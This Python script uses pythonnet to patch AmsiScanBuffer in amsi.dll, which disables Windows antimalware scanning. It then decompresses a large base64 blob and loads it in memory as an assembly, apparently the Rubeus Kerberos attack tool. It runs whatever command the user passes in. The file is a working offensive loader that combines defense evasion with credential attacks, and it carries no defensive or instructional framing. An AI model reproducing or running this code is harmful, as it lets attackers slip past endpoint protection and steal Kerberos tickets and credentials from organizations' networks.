import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()